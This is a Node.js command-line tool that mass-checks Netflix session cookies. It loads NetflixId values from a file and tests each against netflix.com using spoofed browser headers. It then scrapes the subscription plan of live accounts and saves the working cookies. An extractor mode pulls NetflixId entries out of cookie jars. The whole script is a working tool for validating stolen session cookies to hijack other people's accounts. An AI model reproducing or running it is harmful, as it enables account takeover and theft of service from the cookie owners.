#!/usr/bin/env node
'use strict';

const axios  = require('axios');
const fs     = require('fs');
const path   = require('path');
const colors = require('colors');

// ─── CONFIG ──────────────────────────────────────────────────────────────────

const CONFIG = {
  concurrency : 3,       // parallel checks at once
  timeout     : 15000,   // ms per request
  delay       : 800,     // ms between batches
  inputFile   : 'cookies.txt',
  outputFile  : 'valids.txt',
  maxRedirects: 5
};

const HEADERS = {
  'User-Agent'               : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Accept'                   : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language'          : 'en-US,en;q=0.9',
  'Accept-Encoding'          : 'gzip, deflate, br',
  'Connection'               : 'keep-alive',
  'Upgrade-Insecure-Requests': '1',
  'Sec-Fetch-Dest'           : 'document',
  'Sec-Fetch-Mode'           : 'navigate',
  'Sec-Fetch-Site'           : 'none',
  'Cache-Control'            : 'max-age=0'
};

// ─── PARSE COOKIE LINE ────────────────────────────────────────────────────────
// Accepts formats:
//   NetflixId=<value>
//   NetflixId=<value>|extra info
//   <tab-separated Netscape cookie jar line>

function parseLine(line) {
  line = line.trim();
  if (!line || line.startsWith('#')) return null;

  // Netscape cookie jar format (tab-separated, 7 columns)
  if (line.includes('\t')) {
    const parts = line.split('\t');
    if (parts.length >= 7 && parts[5] === 'NetflixId' && parts[6]) {
      return `NetflixId=${parts[6].trim()}`;
    }
    return null;
  }

  // Already in NetflixId=... format (strip any trailing pipe metadata)
  if (line.startsWith('NetflixId=')) {
    return line.split('|')[0].trim();
  }

  // Bare value — wrap it
  if (line.length > 20) {
    return `NetflixId=${line}`;
  }

  return null;
}

// ─── EXTRACT PLAN FROM HTML ───────────────────────────────────────────────────

function extractPlan(html) {
  // Primary selector used by the original checker
  let m = html.match(/data-uia="account-overview-page\+membership-card\+title"[^>]*>([^<]+)</i);
  if (m) return m[1].trim();

  // Fallback: look for plan name keywords
  const plans = ['Premium', 'Standard with ads', 'Standard', 'Basic', 'Mobile'];
  for (const plan of plans) {
    if (html.includes(plan)) return plan;
  }

  return 'unknown_plan';
}

// ─── CHECK ONE COOKIE ─────────────────────────────────────────────────────────

async function checkCookie(cookie) {
  const preview = cookie.substring(0, 55) + (cookie.length > 55 ? '…' : '');

  try {
    const res = await axios.get('https://www.netflix.com/browse', {
      headers     : { ...HEADERS, Cookie: cookie },
      timeout     : CONFIG.timeout,
      maxRedirects: CONFIG.maxRedirects,
      validateStatus: () => true   // don't throw on 4xx
    });

    const finalUrl = res.request?.res?.responseUrl || res.config?.url || '';

    if (res.status === 200 && finalUrl.includes('/browse')) {
      // Cookie is live — get plan
      const plan = await getPlan(cookie);
      console.log(`[+] ${preview} | ${plan}`.green);
      return { live: true, cookie, plan };
    }

    // Redirected to /login or elsewhere = dead
    console.log(`[-] ${preview} | dead`.red);
    return { live: false };

  } catch (err) {
    const code = err.response?.status || err.code || 'timeout';
    console.log(`[-] ${preview} | error: ${code}`.red);
    return { live: false };
  }
}

// ─── GET PLAN ─────────────────────────────────────────────────────────────────

async function getPlan(cookie) {
  try {
    const res = await axios.get('https://www.netflix.com/account', {
      headers     : { ...HEADERS, Cookie: cookie },
      timeout     : CONFIG.timeout,
      maxRedirects: CONFIG.maxRedirects,
      validateStatus: () => true
    });

    if (res.status === 200) return extractPlan(res.data);
    return 'unknown_plan';

  } catch (_) {
    return 'unknown_plan';
  }
}

// ─── PROGRESS BAR ─────────────────────────────────────────────────────────────

function drawProgress(done, total, live) {
  if (!process.stdout.isTTY) return;
  const width  = 28;
  const filled = Math.round(width * done / total);
  const bar    = '█'.repeat(filled) + '░'.repeat(width - filled);
  const pct    = Math.round((done / total) * 100).toString().padStart(3);
  process.stdout.write(
    `\r  [${bar}] ${pct}%  ${done}/${total}  ✓ ${live}  ✗ ${done - live}   `
  );
}

function clearProgress() {
  if (process.stdout.isTTY) {
    process.stdout.write('\r' + ' '.repeat(70) + '\r');
  }
}

// ─── RUN BATCH ────────────────────────────────────────────────────────────────

async function runBatch(cookies) {
  return Promise.all(cookies.map(c => checkCookie(c)));
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────

async function main() {
  const inputPath  = path.resolve(CONFIG.inputFile);
  const outputPath = path.resolve(CONFIG.outputFile);

  if (!fs.existsSync(inputPath)) {
    console.error(`[-] ${CONFIG.inputFile} not found`.red);
    process.exit(1);
  }

  const raw   = fs.readFileSync(inputPath, 'utf8');
  const lines = raw.split('\n').map(parseLine).filter(Boolean);

  if (!lines.length) {
    console.error('[-] No valid cookies found in file'.red);
    process.exit(1);
  }

  console.log(`\n[#] ${lines.length} cookie(s) loaded`.cyan);
  console.log('[#] Checking…\n'.cyan);

  const valid = [];
  let checked = 0;

  // Process in concurrent batches
  for (let i = 0; i < lines.length; i += CONFIG.concurrency) {
    // Clear progress bar before the next batch's result lines print
    if (checked > 0) clearProgress();

    const batch   = lines.slice(i, i + CONFIG.concurrency);
    const results = await runBatch(batch);

    for (const r of results) {
      checked++;
      if (r.live) valid.push(r.cookie);
    }

    // Draw updated progress bar after batch
    drawProgress(checked, lines.length, valid.length);

    // Delay between batches (skip after last)
    if (i + CONFIG.concurrency < lines.length) {
      await new Promise(r => setTimeout(r, CONFIG.delay));
    }
  }

  // End progress bar line
  if (process.stdout.isTTY) process.stdout.write('\n');

  // Summary
  console.log('');
  console.log(`[@] Checked : ${checked}`.cyan);
  console.log(`[+] Live    : ${valid.length}`.green);
  console.log(`[-] Dead    : ${checked - valid.length}`.red);

  if (valid.length > 0) {
    fs.writeFileSync(outputPath, valid.join('\n') + '\n', 'utf8');
    console.log(`\n[@] Saved ${valid.length} valid cookie(s) → ${CONFIG.outputFile}`.yellow);
  }
}

// ─── EXTRACTOR MODE ───────────────────────────────────────────────────────────
// node checker.js --extract [input] [output]
// Reads a Netscape cookie jar or raw file and extracts NetflixId= lines

function runExtract() {
  const input  = process.argv[3] || 'cookies_raw.txt';
  const output = process.argv[4] || CONFIG.inputFile;

  if (!fs.existsSync(input)) {
    console.error(`[-] ${input} not found`.red);
    process.exit(1);
  }

  const raw    = fs.readFileSync(input, 'utf8');
  const parsed = [...new Set(
    raw.split('\n').map(parseLine).filter(Boolean)
  )];

  fs.writeFileSync(output, parsed.join('\n') + '\n', 'utf8');
  console.log(`[+] ${parsed.length} NetflixId(s) extracted → ${output}`.green);
}

// ─── ENTRY ────────────────────────────────────────────────────────────────────

if (process.argv[2] === '--extract') {
  runExtract();
} else {
  main().catch(err => {
    console.error('Fatal:', err.message);
    process.exit(1);
  });
}
